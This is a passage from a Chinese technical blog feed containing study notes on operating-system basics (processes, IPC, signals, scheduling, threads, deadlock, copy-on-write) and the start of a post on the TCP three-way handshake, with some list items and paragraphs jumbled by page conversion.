title="减少磁盘延迟时间的方法"></a>减少磁盘延迟时间的方法</h2><h3 id="交替编号：在读取连续扇区时，每读完一个扇区需要时间处理读取的内容，由于磁头还没有准备好，可能在处理过程中就错过了连续扇区的内容，这个时候需要再转一圈转到未读的地方，所以一般间隔编号依次交替解决问题"><a href="#交替编号：在读取连续扇区时，每读完一个扇区需要时间处理读取的内容，由于磁头还没有准备好，可能在处理过程中就错过了连续扇区的内容，这个时候需要再转一圈转到未读的地方，所以一般间隔编号依次交替解决问题" class="headerlink" title="交替编号：在读取连续扇区时，每读完一个扇区需要时间处理读取的内容，由于磁头还没有准备好，可能在处理过程中就错过了连续扇区的内容，这个时候需要再转一圈转到未读的地方，所以一般间隔编号依次交替解决问题"></a>交替编号：在读取连续扇区时，每读完一个扇区需要时间处理读取的内容，由于磁头还没有准备好，可能在处理过程中就错过了连续扇区的内容，这个时候需要再转一圈转到未读的地方，所以一般间隔编号依次交替解决问题</h3><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158602935-29af1c8b-e82e-401f-a5a1-b6403477c4e2.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158617736-267af6e6-4c29-4018-b47f-cc5d2bbd8ebc.png"></p><h3 id="错位命名"><a href="#错位命名" class="headerlink" title="错位命名"></a>错位命名</h3><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158624171-04575605-acb3-4674-b007-27604d30e4e6.png"></p><h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158633543-d2a53e44-a662-4432-8002-c75cad6e4eec.png"></p><h1 id="select-poll-epoll"><a href="#select-poll-epoll" class="headerlink" title="select poll epoll"></a>select poll epoll</h1><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1660451847923-06791649-8b89-47b1-a15b-681028a98022.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1660452134996-339c0cca-443a-48ad-ae35-341acd62e413.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1660452275840-a5850af5-955f-4084-be8e-8ed4e1b25d0c.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1660452616552-0d03877d-ca4e-4348-b0d8-e08f572a79b9.png"></p><h1 id="什么是操作系统？请简要概述一下"><a href="#什么是操作系统？请简要概述一下" class="headerlink" title="什么是操作系统？请简要概述一下"></a>什么是操作系统？请简要概述一下</h1><p>操作系统是管理计算机硬件和软件资源的计算机程序，提供一个计算机用户与计算机硬件系统之间的接口。<br>向上对用户程序提供接口，向下接管硬件资源。<br>操作系统本质上也是一个软件，作为最接近硬件的系统软件，负责处理器管理、存储器管理、设备管理、文件管理和提供用户接口。 </p><h1 id="操作系统有哪些分类？"><a href="#操作系统有哪些分类？" class="headerlink" title="操作系统有哪些分类？"></a>操作系统有哪些分类？</h1><p>操作系统常规可分为批处理操作系统、分时操作系统、实时操作系统。<br>若一个操作系统兼顾批操作和分时的功能，则称该系统为通用操作系统。<br>常见的通用操作系统有：Windows、Linux、MacOS等。 </p><h1 id="什么是内核态和用户态？"><a href="#什么是内核态和用户态？" class="headerlink" title="什么是内核态和用户态？"></a>什么是内核态和用户态？</h1><p>为了避免操作系统和关键数据被用户程序破坏，将处理器的执行状态分为内核态和用户态。<br>内核态是操作系统管理程序执行时所处的状态，能够执行包含特权指令在内的一切指令，能够访问系统内所有的存储空间。<br>用户态是用户程序执行时处理器所处的状态，不能执行特权指令，只能访问用户地址空间。<br>用户程序运行在用户态,操作系统内核运行在内核态。 </p><h1 id="如何实现内核态和用户态的切换？"><a href="#如何实现内核态和用户态的切换？" class="headerlink" title="如何实现内核态和用户态的切换？"></a>如何实现内核态和用户态的切换？</h1><p>处理器从用户态切换到内核态的方法有三种：系统调用、异常和外部中断。 </p><ol><li><p>系统调用是操作系统的最小功能单位，是操作系统提供的用户接口，系统调用本身是一种软中断。 </p></li><li><p>异常，也叫做内中断，是由错误引起的，如文件损坏、缺页故障等。 </p></li><li><p>外部中断，是通过两根信号线来通知处理器外设的状态变化，是硬中断。 </p><h1 id="并发和并行的区别"><a href="#并发和并行的区别" class="headerlink" title="并发和并行的区别"></a>并发和并行的区别</h1></li><li><p>并发（concurrency）：指宏观上看起来两个程序在同时运行，比如说在单核cpu上的多任务。但是从微观上看两个程序的指令是交织着运行的，指令之间交错执行，在单个周期内只运行了一个指令。这种并发并不能提高计算机的性能，只能提高效率（如降低某个进程的相应时间）。 </p></li><li><p>并行（parallelism）：指严格物理意义上的同时运行，比如多核cpu，两个程序分别运行在两个核上，两者之间互不影响，单个周期内每个程序都运行了自己的指令，也就是运行了两条指令。这样说来并行的确提高了计算机的效率。所以现在的cpu都是往多核方面发展。 </p><h1 id="什么是进程？"><a href="#什么是进程？" class="headerlink" title="什么是进程？"></a>什么是进程？</h1><p>进程是操作系统中最重要的抽象概念之一，是资源分配的基本单位，是独立运行的基本单位。<br>进程的经典定义就是一个执行中程序的实例。系统中的每个程序都运行在某个进程的上下文（context）中。<br>上下文是由程序正确运行所需的状态组成的。这个状态包括存放在内存中的程序的代码和数据，它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。<br>进程一般由以下的部分组成： </p></li><li><p>进程控制块PCB，是进程存在的唯一标志，包含进程标识符PID，进程当前状态，程序和数据地址，进程优先级、CPU现场保护区（用于进程切换），占有的资源清单等。 </p></li><li><p>程序段 </p></li><li><p>数据段 </p></li></ol><h1 id="进程的基本操作"><a href="#进程的基本操作" class="headerlink" title="进程的基本操作"></a>进程的基本操作</h1><p>以Unix系统举例： </p><ol><li> 进程的创建：fork()。新创建的子进程几乎但不完全与父进程相同。子进程得到与父进程用户级虚拟地址空间相同的(但是独立的)一份副本，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，这就意味着当父进程调用 fork 时，子进程可以读写父进程中打开的任何文件。父进程和新创建的子进程之间最大的区别在于它们有不同的 PID。fork函数是有趣的（也常常令人迷惑）， 因为它只被调用一次，却会返回两次：一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中，fork 返回子进程的 PID。在子进程中，fork 返回 0。因为子进程的 PID 总是为非零，返回值就提供一个明 确的方法来分辨程序是在父进程还是在子进程中执行。 </li><li> 复制代码回收子进程：当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除。相反，进程被保持在一种已终止的状态中，直到被它的父进程回收（reaped）。当父进程回收已终止的子进程时，内核将子进程的退出状态传递给父进程，然后抛弃已终止的进程。一个进程可以通过调用 waitpid 函数来等待它的子进程终止或者停止。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid_t fork(void);</span><br></pre></td></tr></table></figure><ol start="3"><li>复制代码加载并运行程序：execve 函数在当前进程的上下文中加载并运行一个新程序。<br>复制代码进程终止：</li></ol>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid_t waitpid(pid_t pid, int *statusp, int options);</span><br></pre></td></tr></table></figure>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int execve(const char *filename, const char *argv[], const char *envp[]);</span><br></pre></td></tr></table></figure><ol start="4"><li><p>复制代码<br>每个进程各自有不同的用户地址空间,任何一个进程的全局变量在另一个进程中都看不到，所以进程之间要交换数据必须通过内核,在内核中开辟一块缓冲区,进程A把数据从用户空间拷到内核缓冲区,进程B再从内核缓冲区把数据读走,内核提供的这种机制称为进程间通信。 不同进程间的通信本质：进程之间可以看到一份公共资源；而提供这份资源的形式或者提供者不同，造成了通信方式不同。 进程间通信主要包括管道、系统IPC（包括消息队列、信号量、信号、共享内存等）、以及套接字socket。 管道是一种最基本的IPC机制，作用于有血缘关系的进程之间，完成数据传递。调用pipe系统函数即可创建一个管道。有如下特质： 管道的原理: 管道实为内核使用环形队列机制，借助内核缓冲区实现。 管道的局限性： 它使得多个进程可以访问同一块内存空间，不同进程可以及时看到对方进程中对共享内存中数据得更新。这种方式需要依靠某种同步操作，如互斥锁和信号量等。 特点： 一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的事件。Linux 系统上支持的30 种不同类型的信号。每种信号类型都对应于某种系统事件。低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的。信号提供了一种机制，通知用户进程发生了这些异常。复制代码进程在运行时有三种基本状态：就绪态、运行态和阻塞态。 2.就绪（ready）态：进程具备运行条件，等待系统分配处理器以便运行的状态。 当进程已分配到除CPU以外的所有必要资源后，只要再获得CPU，便可立即执行，进程这时的状态称为就绪状态。在一个系统中处于就绪状态的进程可能有多个，通常将它们排成一个队列，称为就绪队列。 3.阻塞（wait）态：又称等待态或睡眠态，指进程不具备运行条件，正在等待某个时间完成的状态。 各状态之间的转换： 2。僵尸进程：进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait 获waitpid 获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中的这些进程是僵尸进程。 线程产生的原因：进程可以使多个程序能并发执行，以提高资源的利用率和系统的吞吐量；但是其具有一些缺点： 引入线程就是为了解决以上进程的不足，线程具有以下的优点： 进程API以Unix系统为例，线程相关的API属于Posix线程(Pthreads)标准接口。</p><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1659883620324-de53a65b-003b-4a6d-88df-e92155156f45.png"></p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void exit(int status);</span><br></pre></td></tr></table></figure><h1 id="进程如何通过管道进行通信"><a href="#进程如何通过管道进行通信" class="headerlink" title="进程如何通过管道进行通信"></a>进程如何通过管道进行通信</h1><ol><li>其本质是一个伪文件(实为内核缓冲区) </li><li>由两个文件描述符引用，一个表示读端，一个表示写端。 </li><li>规定数据从管道的写端流入管道，从读端流出。 </li><li>数据自己读不能自己写。 </li><li>数据一旦被读走，便不在管道中存在，不可反复读取。 </li><li>由于管道采用半双工通信方式。因此，数据只能在一个方向上流动。 </li><li>只能在有公共祖先的进程间使用管道。 </li></ol><h1 id="进程如何通过共享内存通信？"><a href="#进程如何通过共享内存通信？" class="headerlink" title="进程如何通过共享内存通信？"></a>进程如何通过共享内存通信？</h1><ol><li>共享内存是最快的一种IPC，因为进程是直接对内存进行操作来实现通信，避免了数据在用户空间和内核空间来回拷贝。 </li><li>因为多个进程可以同时操作，所以需要进行同步处理。 </li><li>信号量和共享内存通常结合在一起使用，信号量用来同步对共享内存的访问。 </li></ol><h1 id="什么是信号"><a href="#什么是信号" class="headerlink" title="什么是信号"></a>什么是信号</h1><ol><li>发送信号：内核通过更新目的进程上下文中的某个状态，发送（递送）一个信号给目的进程。发送信号可以有如下两种原因： </li></ol><ul><li>内核检测到一个系统事件，比如除零错误或者子进程终止。 </li><li>—个进程调用了kill 函数， 显式地要求内核发送一个信号给目的进程。一个进程可以发送信号给它自己。 </li></ul><ol start="2"><li>接收信号：当目的进程被内核强迫以某种方式对信号的发送做出反应时，它就接收了信号。进程可以忽略这个信号，终止或者通过执行一个称为信号处理程序(signal handler)的用户层函数捕获这个信号。 </li></ol><h1 id="如何编写正确且安全的信号处理函数"><a href="#如何编写正确且安全的信号处理函数" class="headerlink" title="如何编写正确且安全的信号处理函数"></a>如何编写正确且安全的信号处理函数</h1><ol><li><p>处理程序要尽可能简单。避免麻烦的最好方法是保持处理程序尽可能小和简单。例如，处理程序可能只是简单地设置全局标志并立即返回；所有与接收信号相关的处理都由主程序执行，它周期性地检查(并重置)这个标志。 </p></li><li><p>在处理程序中只调用异步信号安全的函数。所谓异步信号安全的函数(或简称安全的函数)能够被信号处理程序安全地调用，原因有二：要么它是可重入的(例如只访问局部变量），要么它不能被信号处理程序中断。 </p></li><li><p>保存和恢复errno。许多Linux 异步信号安全的函数都会在出错返回时设置errno在处理程序中调用这样的函数可能会干扰主程序中其他依赖于分。解决方法是在进人处理程序时把errno 保存在一个局部变量中，在处理程序返回前恢复它。注意，只有在处理程序要返回时才有此必要。如果处理程序调用_exit终止该进程，那么就不需要这样做了。 </p></li><li><p>阻塞所有的信号，保护对共享全局数据结构的访问。如果处理程序和主程序或其他处理程序共享一个全局数据结构，那么在访问(读或者写)该数据结构时，你的处理程序和主程序应该暂时阻塞所有的信号。这条规则的原因是从主程序访问一个数据结构d 通常需要一系列的指令，如果指令序列被访问d 的处理程序中断，那么处理程序可能会发现d 的状态不一致，得到不可预知的结果。在访问d 时暂时阻塞信号保证了处理程序不会中断该指令序列。 </p></li><li><p>用volatile 声明全局变量。考虑一个处理程序和一个main 函数，它们共享一个全局变量g 。处理程序更新g，main 周期性地读g， 对于一个优化编译器而言，main 中g的值看上去从来没有变化过，因此使用缓存在寄存器中g 的副本来满足对g 的每次引用是很安全的。如果这样，main 函数可能永远都无法看到处理程序更新过的值。可以用volatile 类型限定符来定义一个变量，告诉编译器不要缓存这个变量。例如：volatile 限定符强迫编译器毎次在代码中引用g时，都要从内存中读取g的值。一般来说，和其他所有共享数据结构一样，应该暂时阻塞信号，保护每次对全局变量的访问。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void exit(int status);</span><br></pre></td></tr></table></figure></li><li><p>用sig_atomic_t声明标志。在常见的处理程序设计中，处理程序会写全局标志来记录收到了信号。主程序周期性地读这个标志，响应信号，再清除该标志。对于通过这种方式来共享的标志，C 提供一种整型数据类型sig_atomic_t对它的读和写保证会是原子的（不可中断的）。 </p></li><li><p>信号的一个与直觉不符的方面是未处理的信号是不排队的。因为 pending 位向量中每种类型的信号只对应有一位，所以每种类型最多只能有一个未处理的信号。关键思想是如果存在一个未处理的信号就表明至少有一个信号到达了。 </p></li></ol><h1 id="进程调度的时机"><a href="#进程调度的时机" class="headerlink" title="进程调度的时机"></a>进程调度的时机</h1><ol><li>当前运行的进程运行结束。 </li><li>当前运行的进程由于某种原因阻塞。 </li><li>执行完系统调用等系统程序后返回用户进程。 </li><li>在使用抢占调度的系统中，具有更高优先级的进程就绪时。 </li><li>分时系统中，分给当前进程的时间片用完。 </li></ol><h1 id="不能进行进程调度的情况"><a href="#不能进行进程调度的情况" class="headerlink" title="不能进行进程调度的情况"></a>不能进行进程调度的情况</h1><ol><li>在中断处理程序执行时。 </li><li>在操作系统的内核程序临界区内。 </li><li>其它需要完全屏蔽中断的原子操作过程中。 </li></ol><h1 id="进程调度策略的基本设计指标"><a href="#进程调度策略的基本设计指标" class="headerlink" title="进程调度策略的基本设计指标"></a>进程调度策略的基本设计指标</h1><ol><li>CPU利用率 </li><li>系统吞吐率，即单位时间内CPU完成的作业的数量。 </li><li>响应时间。 </li><li>周转时间。是指作业从提交到完成的时间间隔。从每个作业的角度看，完成每个作业的时间也是很关键 <ul><li>平均周转时间 </li><li>带权周转时间 </li><li>平均带权周转时间 </li></ul></li></ol><h1 id="进程的状态与状态转换"><a href="#进程的状态与状态转换" class="headerlink" title="进程的状态与状态转换"></a>进程的状态与状态转换</h1><ol><li>运行（running）态：进程占有处理器正在运行的状态。进程已获得CPU，其程序正在执行。在单处理机系统中，只有一个进程处于执行状态；在多处理机系统中，则有多个进程处于执行状态。 </li><li>就绪→执行  处于就绪状态的进程，当进程调度程序为之分配了处理机后，该进程便由就绪状态转变成执行状态。 </li><li>执行→就绪  处于执行状态的进程在其执行过程中，因分配给它的一个时间片已用完而不得不让出处理机，于是进程从执行状态转变成就绪状态。 </li><li>执行→阻塞  正在执行的进程因等待某种事件发生而无法继续执行时，便从执行状态变成阻塞状态。 </li><li>阻塞→就绪  处于阻塞状态的进程，若其等待的事件已经发生，于是进程由阻塞状态转变为就绪状态。 </li></ol><h1 id="什么是孤儿进程？僵尸进程"><a href="#什么是孤儿进程？僵尸进程" class="headerlink" title="什么是孤儿进程？僵尸进程?"></a>什么是孤儿进程？僵尸进程?</h1><p>孤儿进程：父进程退出，子进程还在运行的这些子进程都是孤儿进程，孤儿进程将被init进程（1号进程）所收养，并由init进程对他们完成状态收集工作。 </p><h1 id="什么是线程？"><a href="#什么是线程？" class="headerlink" title="什么是线程？"></a>什么是线程？</h1><ol><li>是进程划分的任务，是一个进程内可调度的实体，是CPU调度的基本单位，用于保证程序的实时性，实现进程内部的并发。 </li><li>线程是操作系统可识别的最小执行和调度单位。每个线程都独自占用一个虚拟处理器：独自的寄存器组，指令计数器和处理器状态。 </li><li>每个线程完成不同的任务，但是属于同一个进程的不同线程之间共享同一地址空间（也就是同样的动态内存，映射文件，目标代码等等），打开的文件队列和其他内核资源。 </li></ol><h1 id="为什么需要线程？"><a href="#为什么需要线程？" class="headerlink" title="为什么需要线程？"></a>为什么需要线程？</h1><ol><li>进程在同一时刻只能做一个任务，很多时候不能充分利用CPU资源。 </li><li>进程在执行的过程中如果发生阻塞，整个进程就会挂起，即使进程中其它任务不依赖于等待的资源，进程仍会被阻塞。 </li><li>从资源上来讲，开辟一个线程所需要的资源要远小于一个进程。 </li><li>从切换效率上来讲，运行于一个进程中的多个线程，它们之间使用相同的地址空间，而且线程间彼此切换所需时间也远远小于进程间切换所需要的时间（这种时间的差异主要由于缓存的大量未命中导致）。 </li><li>从通信机制上来讲，线程间方便的通信机制。对不同进程来说，它们具有独立的地址空间，要进行数据的传递只能通过进程间通信的方式进行。线程则不然，属于同一个进程的不同线程之间共享同一地址空间，所以一个线程的数据可以被其它线程感知，线程间可以直接读写进程数据段（如全局变量）来进行通信（需要一些同步措施）。 </li></ol><h1 id="简述线程和进程的区别和联系"><a href="#简述线程和进程的区别和联系" class="headerlink" title="简述线程和进程的区别和联系"></a>简述线程和进程的区别和联系</h1><ol><li>一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程。线程依赖于进程而存在。 </li><li>进程在执行过程中拥有独立的地址空间，而多个线程共享进程的地址空间。（资源分配给进程，同一进程的所有线程共享该进程的所有资源。同一进程中的多个线程共享代码段（代码和常量），数据段（全局变量和静态变量），扩展段（堆存储）。但是每个线程拥有自己的栈段，栈段又叫运行时段，用来存放所有局部变量和临时变量。） </li><li>进程是资源分配的最小单位，线程是CPU调度的最小单位。 </li><li>通信：由于同一进程中的多个线程具有相同的地址空间，使它们之间的同步和通信的实现，也变得比较容易。进程间通信IPC，线程间可以直接读写进程数据段（如全局变量）来进行通信（需要一些同步方法，以保证数据的一致性）。 </li><li>进程编程调试简单可靠性高，但是创建销毁开销大；线程正相反，开销小，切换速度快，但是编程调试相对复杂。 </li><li>进程间不会相互影响；一个进程内某个线程挂掉将导致整个进程挂掉。 </li><li>进程适应于多核、多机分布；线程适用于多核。 </li></ol><h1 id="多线程模型"><a href="#多线程模型" class="headerlink" title="多线程模型"></a>多线程模型</h1><ol><li>多对一模型。将多个用户级线程映射到一个内核级线程上。该模型下，线程在用户空间进行管理，效率较高。缺点就是一个线程阻塞，整个进程内的所有线程都会阻塞。几乎没有系统继续使用这个模型。 </li><li>一对一模型。将内核线程与用户线程一一对应。优点是一个线程阻塞时，不会影响到其它线程的执行。该模型具有更好的并发性。缺点是内核线程数量一般有上限，会限制用户线程的数量。更多的内核线程数目也给线程切换带来额外的负担。linux和Windows操作系统家族都是使用一对一模型。 </li><li>多对多模型。将多个用户级线程映射到多个内核级线程上。结合了多对一模型和一对一模型的特点。 </li></ol><h1 id="如何解决死锁问题？"><a href="#如何解决死锁问题？" class="headerlink" title="如何解决死锁问题？"></a>如何解决死锁问题？</h1><ol><li>资源一次性分配，这样就不会再有请求了（破坏请求条件）。 </li><li>只要有一个资源得不到分配，也不给这个进程分配其他的资源（破坏占有并等待条件）。 </li><li>可抢占资源：即当进程新的资源未得到满足时，释放已占有的资源，从而破坏不可抢占的条件。 </li><li>资源有序分配法：系统给每类资源赋予一个序号，每个进程按编号递增的请求资源，释放则相反，从而破坏环路等待的条件 </li></ol><h1 id="请说一下什么是写时复制？"><a href="#请说一下什么是写时复制？" class="headerlink" title="请说一下什么是写时复制？"></a>请说一下什么是写时复制？</h1><ul><li>如果有多个进程要读取它们自己的那部门资源的副本，那么复制是不必要的。每个进程只要保存一个指向这个资源的指针就可以了。只要没有进程要去修改自己的“副本”，就存在着这样的幻觉：每个进程好像独占那个资源。从而就避免了复制带来的负担。如果一个进程要修改自己的那份资源“副本”，那么就会复制那份资源，并把复制的那份提供给进程。不过其中的复制对进程来说是透明的。这个进程就可以修改复制后的资源了，同时其他的进程仍然共享那份没有修改过的资源。所以这就是名称的由来：在写入时进行复制。 </li><li>算法的好处就在于它们尽量推迟代价高昂的操作，直到必要的时刻才会去执行。 </li><li>在使用虚拟内存的情况下，写时复制（Copy-On-Write）是以页为基础进行的。所以，只要进程不修改它全部的地址空间，那么就不必复制整个地址空间。在fork()调用结束后，父进程和子进程都相信它们有一个自己的地址空间，但实际上它们共享父进程的原始页，接下来这些页又可以被其他的父进程或子进程共享。 </li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;操作系统基础知识&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="https://winkygranger.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="操作系统" scheme="https://winkygranger.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络</title>
    <link href="https://winkygranger.github.io/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <id>https://winkygranger.github.io/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</id>
    <published>2022-05-21T13:03:41.000Z</published>
    <updated>2023-01-18T15:07:47.369Z</updated>
    
    <content type="html"><![CDATA[<p>TCP连接、Http/Https、Cookie/Session</p><span id="more"></span><h1 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h1><p><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657506890803-2f92c24f-e677-4640-aad6-29370dc5f594.png"></p><h1 id="键入网址到网页显示，期间发生了什么？"><a href="#键入网址到网页显示，期间发生了什么？" class="headerlink" title="键入网址到网页显示，期间发生了什么？"></a>键入网址到网页显示，期间发生了什么？</h1><p>1、首先，在浏览器地址栏中输入url<br>2、浏览器先查看浏览器缓存-系统缓存-路由器缓存，如果缓存中有，会直接在屏幕中显示页面内容。若没有，则跳到第三步操作。<br>3、在发送http请求前，需要域名解析(DNS解析)，解析获取相应的IP地址。<br>4、浏览器向服务器发起tcp连接，与浏览器建立tcp三次握手。<br>5、握手成功后，浏览器向服务器发送http请求，请求数据包。<br>6、服务器处理收到的请求，将数据返回至浏览器<br>7、浏览器收到HTTP响应<br>8、读取页面内容，浏览器渲染，解析html源码<br>9、生成Dom树、解析css样式、js交互<br>10、客户端和服务器交互</p><h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><p>TCP 是<strong>面向连接的、可靠的、基于字节流</strong>的传输层通信协议。</p><ul><li><p><strong>面向连接</strong>：一定是「一对一」才能连接，不能像 UDP 协议可以一个主机同时向多个主机发送消息，也就是一对多是无法做到的；</p></li><li><p><strong>可靠的</strong>：无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端；</p></li><li><p><strong>字节流</strong>：用户消息通过 TCP 协议传输时，消息可能会被操作系统「分组」成多个的 TCP 报文，如果接收方的程序如果不知道「消息的边界」，是无法读出一个有效的用户消息的。并且 TCP 报文是「有序的」，当「前一个」TCP 报文没有收到的时候，即使它先收到了后面的 TCP 报文，那么也不能扔给应用层去处理，同时对「重复」的 TCP 报文会自动丢弃。</p><h1 id="TCP-连接建立"><a href="#TCP-连接建立" class="headerlink" title="TCP 连接建立"></a>TCP 连接建立</h1><p>TCP 是面向连接的协议，所以使用 TCP 前必须先建立连接，而<strong>建立连接是通过三次握手来进行的</strong>。三次握手的过程如下图：<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657456521938-f84cf61e-05a5-4a44-97cd-e58e4a108634.png"><br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657456537239-5309a313-193a-4ebd-a21c-b4e33a0784ef.png"><br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657456545095-0909cf57-8a7f-446b-ab40-2ef35e100fc3.png"><br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657456549423-555f88b7-8905-4768-a92b-1e335c3e5dad.png"></p></li><li><p>一开始，客户端和服务端都处于 CLOSED 状态。先是服务端主动监听某个端口，处于 LISTEN 状态</p></li><li><p>客户端会随机初始化序号（client_isn），将此序号置于 TCP 首部的「序号」字段中，同时把 SYN 标志位置为 1 ，表示 SYN 报文。接着把第一个 SYN 报文发送给服务端，表示向服务端发起连接，该报文不包含应用层数据，之后客户端处于 SYN-SENT 状态。</p></li><li><p>服务端收到客户端的 SYN 报文后，首先服务端也随机初始化自己的序号（server_isn），将此序号填入 TCP 首部的「序号」字段中，其次把 TCP 首部的「确认应答号」字段填入 client_isn + 1, 接着把 SYN 和 ACK 标志位置为 1。最后把该报文发给客户端，该报文也不包含应用层数据，之后服务端处于 SYN-RCVD 状态。</p></li><li><p>客户端收到服务端报文后，还要向服务端回应最后一个应答报文，首先该应答报文 TCP 首部 ACK 标志位置为 1 ，其次「确认应答号」字段填入 server_isn + 1 ，最后把报文发送给服务端，<strong>这次报文可以携带客户到服务器的数据</strong>，之后客户端处于 ESTABLISHED 状态。</p></li><li><p>服务器收到客户端的应答报文后，也进入 ESTABLISHED 状态。</p></li></ul><p>从上面的过程可以发现<strong>第三次握手是可以携带数据的，前两次握手是不可以携带数据的</strong>，这也是面试常问的题。</p><h2 id="为什么是三次握手？不是两次、四次？"><a href="#为什么是三次握手？不是两次、四次？" class="headerlink" title="为什么是三次握手？不是两次、四次？"></a>为什么是三次握手？不是两次、四次？</h2><ul><li><strong>三次握手才可以阻止重复历史连接的初始化（主要原因）</strong></li><li><strong>三次握手才可以同步双方的初始序列号</strong></li><li><strong>三次握手才可以避免资源浪费</strong></li></ul><h3 id="阻止重复历史连接的初始化（主要原因）"><a href="#阻止重复历史连接的初始化（主要原因）" class="headerlink" title="阻止重复历史连接的初始化（主要原因）"></a>阻止重复历史连接的初始化（主要原因）</h3><p>简单来说，三次握手的<strong>首要原因是为了防止旧的重复连接初始化造成混乱。</strong><br>我们考虑一个场景，客户端先发送了 SYN（seq = 90） 报文，然后客户端宕机了，而且这个 SYN 报文还被网络阻塞了，服务端并没有收到，接着客户端重启后，又重新向服务端建立连接，发送了 SYN（seq = 100） 报文（注意不是重传 SYN，重传的 SYN 的序列号是一样的）。<br>客户端连续发送多次 SYN 建立连接的报文，在<strong>网络拥堵</strong>情况下：</p><ul><li>一个「旧 SYN 报文」比「最新的 SYN 」 报文早到达了服务端；</li><li>那么此时服务端就会回一个 SYN + ACK 报文给客户端；</li><li>客户端收到后可以根据自身的上下文，判断这是一个历史连接（序列号过期或超时），那么客户端就会发送 RST 报文给服务端，表示中止这一次连接。</li></ul><p><strong>如果是两次握手连接，就无法阻止历史连接</strong>，那为什么 TCP 两次握手为什么无法阻止历史连接呢？主要是因为<strong>在两次握手的情况下，「被动发起方」没有中间状态给「主动发起方」来阻止历史连接，导致「被动发起方」可能建立一个历史连接，造成资源浪费</strong>。</p><h3 id="同步双方的初始序列号"><a href="#同步双方的初始序列号" class="headerlink" title="同步双方的初始序列号"></a>同步双方的初始序列号</h3><p>TCP 协议的通信双方， 都必须维护一个「序列号」， 序列号是可靠传输的一个关键因素，它的作用：</p><ul><li>接收方可以去除重复的数据；</li><li>接收方可以根据数据包的序列号按序接收；</li><li>可以标识发送出去的数据包中， 哪些是已经被对方收到的（通过 ACK 报文中的序列号知道）；</li></ul><p>可见，序列号在 TCP 连接中占据着非常重要的作用，所以当客户端发送携带「初始序列号」的 SYN 报文的时候，需要服务端回一个 ACK 应答报文，表示客户端的 SYN 报文已被服务端成功接收，那当服务端发送「初始序列号」给客户端的时候，依然也要得到客户端的应答回应，<strong>这样一来一回，才能确保双方的初始序列号能被可靠的同步。</strong><br>四次握手其实也能够可靠的同步双方的初始化序号，但由于<strong>第二步和第三步可以优化成一步</strong>，所以就成了「三次握手」。<br>而两次握手只保证了一方的初始序列号能被对方成功接收，没办法保证双方的初始序列号都能被确认接收。<br><img src="/2022/05/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/1657456995831-a3b5cee7-a469-4a0a-aa57-5455dfd07f53.png"></p><h3 id="避免资源浪费"><a href="#避免资源浪费" class="headerlink" title="避免资源浪费"></a>避免资源浪费</h3><p>如果只有「两次握手」，当客户端的 SYN 请求连接在网络中阻塞，客户端没有接收到 ACK 报文，就会重新发送 SYN ，由于没有第三次握手，服务器不清楚客户端是否收到了自己发送的建立连接的 ACK 确认信号，所以每收到一个 SYN 就只能先主动建立一个连接，这会造成什么情况呢？<br>如果客户端的 SYN 阻塞了，重复发送多次 SYN 